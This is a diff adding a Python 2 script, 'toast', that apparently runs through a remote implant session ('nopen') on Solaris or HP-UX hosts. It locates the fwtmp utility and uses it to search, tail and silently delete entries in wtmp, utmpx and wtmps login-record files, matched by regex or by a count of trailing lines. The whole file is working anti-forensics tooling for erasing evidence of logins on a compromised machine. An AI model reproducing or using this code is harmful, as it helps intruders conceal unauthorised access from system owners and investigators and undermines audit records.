@@ -1,0 +1,281 @@
+#!/bin/env python
+
+import autoutils,os,sys,time,re
+from optparse import OptionParser
+
+class toast:
+    def __init__(self):
+        self.nopen = autoutils.autoutils()
+        self.nopen.connect()
+        self.options = None
+
+        self.version = "1.0.0.4"
+
+        sys.stdout = sys.stderr
+
+    def locate(self):
+        found = False
+        bin = ""
+
+        if self.nopen.state["solaris"]:
+            print "Loaded from previous state"
+            bin = "/usr/lib/acct/fwtmp"
+            return bin
+
+        elif self.nopen.state["hpux"]:
+            print "Loaded from previous state"
+            bin = "/usr/sbin/acct/fwtmp"
+            return bin
+
+        #Solaris
+        output,nopenlines,outputlines = self.nopen.doit("-lt /usr/lib/acct/fwtmp")
+
+        if len(outputlines) > 0:
+            bin = "/usr/lib/acct/fwtmp"
+            self.nopen.state["solaris"] = True
+            self.nopen.saveState()
+
+            found = True
+
+        #HPUX
+        else:
+            output,nopenlines,outputlines = self.nopen.doit("-lt /usr/sbin/acct/fwtmp")
+
+            if len(outputlines) > 0:
+                bin = "/usr/sbin/acct/fwtmp"
+                self.nopen.state["hpux"] = True
+                self.nopen.saveState()
+
+                found = True
+            else:
+                return False
+
+        return bin
+
+    def grep(self, bin):
+        if self.options.GREP_REGEX[0] == '\"' and self.options.GREP_REGEX[-1] == '\"':
+            reg = self.options.GREP_REGEX[1:-1]
+        else:
+            reg = self.options.GREP_REGEX
+
+        print "Searcing for pattern: %s" % reg
+
+        cmd = bin
+        if self.options.wtmps:
+            cmd = "%s -X" % cmd
+
+        cmd = "%s < %s | egrep \"%s\"" % (cmd, self.options.dfile, reg)
+        output,nopenlines,outputlines = self.nopen.doit(cmd)
+
+        lines = []
+        for line in outputlines:
+            if line:
+                lines.append(line.strip())
+
+
+        if not lines:
+            print "Unable to locate anything"
+    
+        return True    
+
+    def tail(self, bin):
+        cmd = bin
+        if self.options.wtmps:
+                cmd = "%s -X" % cmd
+    
+        cmd = "%s < %s | tail -%d" % (cmd, self.options.dfile, self.options.NUM)
+        
+        output,nopenlines,outputlines = self.nopen.doit(cmd)
+        
+        print "Finished"
+
+    def clean(self,bin):
+        if self.options.CLEAN_REGEX[0] == '\"' and self.options.CLEAN_REGEX[-1] == '\"':
+            reg = self.options.CLEAN_REGEX[1:-1]
+        else:
+            reg = self.options.CLEAN_REGEX
+
+        print "Searching for pattern: %s" % reg
+
+        cmd = bin
+        if self.options.wtmps:
+            cmd = "%s -X" % cmd
+
+        cmd = "%s < %s | egrep \"%s\"" % (cmd, self.options.dfile, reg)
+        output,nopenlines,outputlines = self.nopen.doit(cmd)
+        
+        lines = []
+    
+        for line in outputlines:
+            line = line.strip()
+    
+            if line: lines.append(line)
+
+        if lines:
+            #for line in lines:
+            #    print line
+
+            answer = self.nopen.getInput("Do you want to clean these lines? [y/N]", default='n')
+            answer = answer.lower()
+
+            if answer == 'n':
+                return False
+            
+        else:
+            print "Could not find anything"
+            return False
+            
+
+        output,nopenlines,outputlines = self.nopen.doit("-lt .w")
+        if outputlines:
+            print ".w exists"
+            print "Please remove first!"
+            return False
+
+        print "Cleaning These lines"
+        cmd = bin
+        
+        if self.options.wtmps:
+            cmd = "%s -X" % cmd
+
+        cmd = """%s < %s | egrep -v "%s" | %s -ic""" % (cmd, self.options.dfile, reg, bin)
+        if self.options.wtmps:
+            cmd = "%sX" % cmd
+
+        cmd = "%s > .w && cat .w > %s && rm -f .w" % (cmd, self.options.dfile)
+
+        output,nopenlines,outputlines = self.nopen.doit(cmd)
+
+        print "iyf"
+        
+        return True
+
+    def lines(self, bin):
+        cmd = bin
+        if self.options.wtmps:
+            cmd = "%s -X" % cmd
+        
+        cmd = "%s < %s | tail -%s" % (cmd, self.options.dfile, self.options.LINES)
+        output,nopenlines,outputlines = self.nopen.doit(cmd)
+
+        answer = self.nopen.getInput("Do you want to clean these lines? [y/N]", default='n')
+        answer = answer.lower()
+        if answer == 'n':
+            return False
+
+        cmd = bin
+        if self.options.wtmps:
+            cmd = "%s -X" % cmd
+
+            output,nopenlines,outputlines = self.nopen.doit("-lt .w")
+            if outputlines:
+                print ".w exists"
+                print "Please remove first!"
+                return False
+
+    
+        output,nopenlines,outputlines = self.nopen.doit("%s < %s | wc" % (cmd, self.options.dfile))
+        numLines = re.search("^\s+(\d+)", output)
+        if not numLines:
+            print "Can not determine number of lines"
+            return False
+    
+        numLines = numLines.group(1)
+        self.options.LINES = str(int(numLines) - int(self.options.LINES))
+        print self.options.LINES
+        print numLines
+        if int(self.options.LINES) < 1 or int(self.options.LINES) > int(numLines):
+            print "Number of lines can not exceed total number of lines in the file"
+            return False
+            
+        cmd = "%s < %s | head -%s | %s -ic" % (cmd, self.options.dfile, self.options.LINES, bin)
+        if self.options.wtmps:
+            cmd = "%sX" % cmd
+
+        cmd = "%s > .w && cat .w > %s && rm -f .w" % (cmd, self.options.dfile)
+        
+        output,nopenlines,outputlines = self.nopen.doit(cmd)
+
+        print "iyf"
+        return True
+        
+    def main(self):
+        if not self.parseArgs():
+            return 0
+
+        if self.nopen.status["targetos"].find("5.8") != -1:
+            print "Can not work on sparc 5.8"
+            return 0
+
+        output,nopenlines,outputlines = self.nopen.doit("-lt %s" % self.options.dfile)
+        if not outputlines:
+            print "%s does not exist" % self.options.dfile
+            return 0
+
+        bin = self.locate()
+    
+        if not bin:
+            print "Can not continue, unable to locate fwtmp binary"
+            return 1
+
+
+        if (self.nopen.state["hpux"] or self.nopen.state["hpux_it"]) and self.options.dfile.find("utmpx") != -1:
+            print "Unable to run -gs toast on utmpx on HPUX"
+            return False
+
+        if self.options.NUM:
+            self.tail(bin)
+        elif self.options.CLEAN_REGEX:
+            self.clean(bin)
+        elif self.options.GREP_REGEX:
+            self.grep(bin)
+        elif self.options.LINES:
+            self.lines(bin)
+
+    def parseArgs(self):
+        print self.version
+
+        parser = OptionParser()
+        parser.add_option("-t", dest="NUM", type="int", action="store", help="Tail NUM entries")
+        parser.add_option("-f", dest="dfile", type="string", action="store", help="/path/to/file (required)")
+        parser.add_option("-s", dest="wtmps", action="store_true", default=False, help="Used for wtmps files")
+        parser.add_option("-g", dest="GREP_REGEX", type="string", action="store", help="Passes REGEX to egrep for tail")
+        parser.add_option("-c", dest="CLEAN_REGEX", type="string", action="store", help="Uses REGEX to clean")
+        parser.add_option("-l", dest="LINES", type="string", action="store", help="Remove NUM lines")
+
+        (options, args) = parser.parse_args(sys.argv)
+
+        if not options.dfile:
+            parser.print_help()
+            return False
+
+        if options.NUM and options.CLEAN_REGEX:
+            print "ERROR: Can not use clean and tail"
+            parser.print_help()
+            return False
+    
+        if (options.GREP_REGEX and options.CLEAN_REGEX) or (options.GREP_REGEX and options.NUM):
+            print "ERROR: Can not use grep with clean or tail"
+            parser.print_help()
+            return False
+
+        if (options.dfile.find("wtmps") == -1 and options.dfile.find("btmps") == -1) and options.wtmps:
+            print "ERROR: Must specify wtmps file with -s"
+            parser.print_help()
+            return False
+
+        if options.CLEAN_REGEX:
+            while (options.CLEAN_REGEX[0] == "\"" and options.CLEAN_REGEX[-1] != "\"") or len(parser.largs) > 1:
+                options.CLEAN_REGEX = "%s %s" % (options.CLEAN_REGEX, parser.largs.pop(1))
+
+                if options.GREP_REGEX:
+                        while (options.GREP_REGEX[0] == "\"" and options.GREP_REGEX[-1] != "\"") or len(parser.largs) > 1:
+                                options.GREP_REGEX = "%s %s" % (options.GREP_REGEX, parser.largs.pop(1))
+
+
+
+        self.options = options
+
+        return True
+
+toast().main()
